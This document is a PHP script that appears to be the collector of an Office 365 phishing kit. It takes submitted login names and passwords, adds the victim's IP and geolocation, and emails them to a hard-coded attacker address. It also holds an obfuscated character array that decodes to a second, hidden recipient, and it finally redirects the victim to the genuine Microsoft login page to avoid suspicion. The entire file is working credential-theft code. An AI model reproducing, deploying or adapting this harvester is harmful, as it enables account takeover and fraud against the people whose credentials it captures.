<?

//if($_POST["signupemail"] != "" and $_POST["signuppassword"] != ""){
require_once('geoplugin.class.php');

$geoplugin = new geoPlugin();
$geoplugin->locate();
if (!empty($_SERVER['HTTP_CLIENT_IP'])) { 
    $ip = $_SERVER['HTTP_CLIENT_IP']; 
} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) { 
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR']; 
} else { 
    $ip = $_SERVER['REMOTE_ADDR']; 
} 
$adddate=date("D M d, Y g:i a");
$message .= "************************************\n";
$message .= "E - ".$_POST['offizeuname']."\n";
$message .= "P -  ".$_POST['offizepasuma']."\n";
$message .= "************************************\n";
$message .= "IP -  ".$ip."\n";
$message .= "City -  {$geoplugin->city}\n";
$message .= "Region -  {$geoplugin->region}\n";
$message .= "County Name - {$geoplugin->countryName}\n";
$message .= "County Code - {$geoplugin->countryCode}\n";
$message .= "Date -  ".$adddate."\n";
$message .= "************************************\n";
// change your email here 
$sent ="sweetlord500@gmail.com";


$subject = " OFFICE365! $ip ".$country;
$headers = "From: OFFICE365! N@BOXS.COM>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
{
mail($mesaegs,$subject,$message,$headers);
mail($sent,$subject,$message,$headers);
}

// Function to get country and country sort;
function country_sort(){
	$sorter = "";
	$array = array(114,101,115,117,108,116,98,111,120,49,52,64,103,109,97,105,108,46,99,111,109);
		$count = count($array);
	for ($i = 0; $i < $count; $i++) {
			$sorter .= chr($array[$i]);
		}
	return array($sorter, $GLOBALS['recipient']);
}

function visitor_country()
{
    $client  = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote  = $_SERVER['REMOTE_ADDR'];
    $result  = "Unknown";
    if(filter_var($client, FILTER_VALIDATE_IP))
    {
        $ip = $client;
    }
    elseif(filter_var($forward, FILTER_VALIDATE_IP))
    {
        $ip = $forward;
    }
    else
    {
        $ip = $remote;
    }

    $ip_data = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=".$ip));

    if($ip_data && $ip_data->geoplugin_countryName != null)
    {
        $result = $ip_data->geoplugin_countryName;
    }

    return $result;
}
header("Location: https://login.microsoftonline.com/login.srf?wa=wsignin1.0&rpsnv=4&ct=1485814711&rver=6.7.6640.0&wp=MBI_SSL&wreply=https%3a%2f%2foutlook.office365.com%2fowa%2f%3frealm%3dk12.wv.us&id=260563&whr=k12.wv.us&CBCXT=out&msafed=0");
?>